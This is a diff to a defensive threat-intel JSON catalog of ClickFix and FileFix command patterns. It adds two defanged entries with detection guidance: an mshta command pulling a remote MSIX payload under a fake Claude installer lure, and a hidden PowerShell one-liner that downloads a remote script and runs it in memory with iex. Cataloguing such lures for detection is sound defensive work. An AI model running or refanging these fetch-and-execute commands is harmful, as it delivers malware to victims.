@@ -3,7 +3,7 @@
     "title": "ClickFix Command Catalog",
     "purpose": "Defensive threat-intel reference of ClickFix (fake-CAPTCHA / paste-and-run) command patterns for detection engineering and threat hunting.",
     "warning": "All commands are DEFANGED malicious samples for DETECTION ONLY. Do not execute. URLs neutralised (hxxp, [.]).",
-    "updated": "2026-09-05"
+    "updated": "2026-09-07"
   },
   "entries": [
     {
@@ -295,6 +295,26 @@
       "source": "Huntress",
       "source_url": "hxxps://www[.]huntress[.]com/blog/clickfix-malware-buried-in-images",
       "date_added": "2025-11-24"
+    },
+    {
+      "id": "cf-0030",
+      "command": "mshta hxxp://download-version[.]1-5-8[.]com/claude.msixbundle",
+      "executor": "mshta.exe",
+      "technique": "Fake 'Claude AI' installer ClickFix lure; victim pastes into Run dialog and mshta fetches a remote MSIX bundle payload leading to staged PowerShell + process injection",
+      "detection": "Alert on mshta.exe with a remote http/https URL argument, especially fetching .msixbundle/.msix; correlate with new entries in HKCU\\...\\Explorer\\RunMRU",
+      "source": "Rapid7 Labs",
+      "source_url": "hxxps://www[.]rapid7[.]com/blog/post/ve-clickfix-phishing-campaign-fake-claude-installer/",
+      "date_added": "2026-04-09"
+    },
+    {
+      "id": "cf-0031",
+      "command": "powershell -w h -nop -c \"$ic='hxxps://tersmoles[.]com/script.ps1';$w=New-Object -Com Microsoft.XMLHTTP;$w.open('GET',$ic,$false);$w.send();iex([Text.Encoding]::UTF8.GetString($w.responseBody))\"",
+      "executor": "powershell.exe",
+      "technique": "FileFix (evolved ClickFix) — command pasted into the File Explorer address bar with a legit-looking path after '#'; uses legacy Microsoft.XMLHTTP COM to pull and iex-execute a remote PS1 in memory",
+      "detection": "Alert on explorer.exe or msedge.exe spawning powershell.exe that instantiates the Microsoft.XMLHTTP COM object and pipes responseBody to iex; hunt '-w h -nop' one-liners from browser/Explorer parents",
+      "source": "Bridewell",
+      "source_url": "hxxps://www[.]bridewell[.]com/insights/blogs/detail/filefix-the-evolved-clickfix",
+      "date_added": "2025-08-22"
     }
   ]
 }
